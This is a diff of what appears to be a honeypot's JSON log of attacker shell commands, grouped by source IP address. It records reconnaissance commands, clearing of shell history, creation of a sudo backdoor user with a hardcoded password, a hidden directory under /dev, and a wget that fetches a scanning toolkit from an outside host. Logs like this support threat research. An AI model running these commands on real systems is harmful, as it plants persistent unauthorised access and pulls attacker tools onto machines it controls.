@@ -599,6 +599,24 @@
             "session": "f3f5fc8e5fb0"
         },
         {
+            "timestamp": "2023-11-13T06:53:29.088297Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "fed7ecbbe384"
+        },
+        {
+            "timestamp": "2023-11-13T06:59:29.732550Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "44c33291f05b"
+        },
+        {
+            "timestamp": "2023-11-13T07:05:31.504240Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "45e3eda88fbd"
+        },
+        {
             "timestamp": "2023-11-09T22:10:37.262975Z",
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
@@ -675,6 +693,88 @@
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
             "session": "8cb7481e4515"
+        }
+    ],
+    "45.33.35.211": [
+        {
+            "timestamp": "2023-11-13T07:04:55.348506Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 skRJagXq) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "ed9aca0fec6c"
+        },
+        {
+            "timestamp": "2023-11-13T07:04:55.349062Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 skRJagXq",
+            "session": "ed9aca0fec6c"
+        }
+    ],
+    "217.156.4.2": [
+        {
+            "timestamp": "2023-11-13T07:08:28.062346Z",
+            "event": "command_input",
+            "input": "unset HISTFILE",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:08:28.408514Z",
+            "event": "command_input",
+            "input": "",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:08:28.698430Z",
+            "event": "command_input",
+            "input": "w",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:08:37.963962Z",
+            "event": "command_input",
+            "input": "uname -a ",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:08:42.375058Z",
+            "event": "command_input",
+            "input": "ps ax",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:09:31.552809Z",
+            "event": "command_input",
+            "input": "cd /dev",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:09:36.522082Z",
+            "event": "command_input",
+            "input": "mkdir netowkr",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:09:44.505618Z",
+            "event": "command_input",
+            "input": "cd netowkr/",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-13T07:09:50.355555Z",
+            "event": "command_input",
+            "input": "wget 58.216.207.82/scan.tar",
+            "session": "b06c47c7a9c1"
+        },
+        {
+            "timestamp": "2023-11-12T23:13:30.806031Z",
+            "event": "command_input",
+            "input": "grep -c ^processor /proc/cpuinfo",
+            "session": "9dbff2539e8f"
+        },
+        {
+            "timestamp": "2023-11-12T23:13:32.854266Z",
+            "event": "command_input",
+            "input": "grep -c ^processor /proc/cpuinfo",
+            "session": "ab532e8b290d"
         }
     ],
     "189.112.0.11": [
@@ -9599,20 +9699,6 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "858005901a2e"
-        }
-    ],
-    "217.156.4.2": [
-        {
-            "timestamp": "2023-11-12T23:13:30.806031Z",
-            "event": "command_input",
-            "input": "grep -c ^processor /proc/cpuinfo",
-            "session": "9dbff2539e8f"
-        },
-        {
-            "timestamp": "2023-11-12T23:13:32.854266Z",
-            "event": "command_input",
-            "input": "grep -c ^processor /proc/cpuinfo",
-            "session": "ab532e8b290d"
         }
     ],
     "185.220.101.155": [
